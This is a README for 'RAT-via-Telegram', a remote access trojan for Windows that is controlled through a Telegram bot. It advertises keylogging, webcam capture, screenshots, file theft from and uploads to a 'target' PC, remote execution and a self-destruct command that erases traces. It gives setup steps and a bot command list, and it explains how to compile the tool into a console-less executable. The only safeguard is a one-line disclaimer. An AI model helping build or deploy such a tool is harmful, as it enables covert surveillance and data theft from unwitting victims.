# RAT-via-Telegram

Windows Remote Administration Tool via Telegram

### Why another one?

The current Remote Administration Tools in the market face 2 major problems:

- Lack of encryption.
- Require port forwarding in order to control from hundreds of miles.

This RAT overcomes both these issues by using the Telegram bot API.

- Fully encrypted. The data being exchanged cannot be spied upon using MITM tools.
- Telegram messenger app provides a simple way to communicate to the target without configuring port forward before hand on the target.

## Features:

- Run keylogger on the target PC.
- Get target PC's Windows version, processor and more.
- List any directories on the target.
- Download any file locally from the target PC in the background.
- Upload local files on to the target PC. Just send any file to the Telegram bot that you wish to upload.
- Screenshots of the target PC.
- Take snapshots from the webcam (if attached).
- Self-Destruct RAT with a single command.
- More coming soon!

## Screenshots:

<img src="http://i.imgur.com/surSaEm.png" width="290"><img src="http://i.imgur.com/4pL4RJM.png" width="290"><img src="http://i.imgur.com/b77UVxL.png" width="290">

## Installation & Usage:

- Set up a new Telegram bot talking to the BotFather.
- Copy the token and add it in the bottom of the script in [Line 138](RATAttack.py#L138).
- Clone this repository.
- Install the dependencies: `pip install -r requirements.txt`.
- To run the script: `python TeleRAT.py`.
- Find your bot and send some command to the bot to test it.
- To restrict the bot, so that it responds only to you, note down your chat_id from the console and replace it in [Line 131](RATAttack.py#L131) and uncomment [Line 42](RATAttack.py#L42).
<img src="http://i.imgur.com/XKARtrp.png">

### Commands:

When using the below commands; use `/` as a prefix. For example: `/pc_info`.

```
pc_info - PC information
msg_box - display message box with text
snapshot - take picture with webcam
ip_info - via ipinfo.io
download_file - download file from target
list_dir - list contents of directory
run_file - run a file on target
capture_pc - screenshot PC
keylogs - get keylogs
self_destruct - destroy all traces from target PC
```

You can copy the above to update your command list via `BotFather` so you don't have to type them manually.

## Compiling:

- Goto `C:\Python27\Scripts\` or wherever you installed python.
- Run `pyinstaller --onefile --noconsole C:\path\to\RATAttack.py`.
- Once it is compiled successfully, find the `.exe` file in `C:\Python27\Scripts\dist\`.

## Notes:

- `/msg_box` is still in beta and may not work properly.
- Keylogger may detect some keys improperly. Like pressing `shift+/` results in `/` instead of `?`.

## Disclaimer:

<b>This tool is supposed to be used only on authorized systems. Any unauthorized use of this tool without explicit permission is illegal.</b>

## License:

`The MIT License`
